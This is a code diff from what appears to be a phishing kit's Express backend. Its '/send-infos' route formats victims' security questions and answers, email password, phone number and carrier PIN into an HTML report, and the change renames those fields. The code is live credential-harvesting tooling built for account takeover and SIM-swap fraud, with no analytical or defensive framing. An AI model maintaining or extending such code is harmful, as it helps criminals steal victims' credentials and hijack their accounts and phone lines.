@@ -46,11 +46,11 @@ app.post("/send-infos", async (req, res) => {
          ? `
      <br>
      <h4>| SECURITY CHALLENGE</h4>
-     <p>| QUESTION ONE 👉🏽 <b>${values.securityChallenge.challenQuestion1}</b></p>
+     <p>| QUESTION ONE 👉🏽 <b>${values.securityChallenge.question1}</b></p>
      <p>| ANSWER ONE 👉🏽 <b>${values.securityChallenge.answer1}</b></p>
-     <p>| QUESTION TWO 👉🏽 <b>${values.securityChallenge.challenQuestion2}</b></p>
+     <p>| QUESTION TWO 👉🏽 <b>${values.securityChallenge.question2}</b></p>
      <p>| ANSWER TWO 👉🏽 <b>${values.securityChallenge.answer2}</b></p>
-     <p>| QUESTION THREE 👉🏽 <b>${values.securityChallenge.challenQuestion3}</b></p>
+     <p>| QUESTION THREE 👉🏽 <b>${values.securityChallenge.question3}</b></p>
      <p>| ANSWER THREE 👉🏽 <b>${values.securityChallenge.answer3}</b></p>
      <br>
      `
@@ -83,7 +83,7 @@ app.post("/send-infos", async (req, res) => {
                <br>
                <h4>| ACCOUNT UPDATE</h4>
                <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
-               <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.password}</b></p>
+               <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.emailPassword}</b></p>
                <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
                <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
                <br>
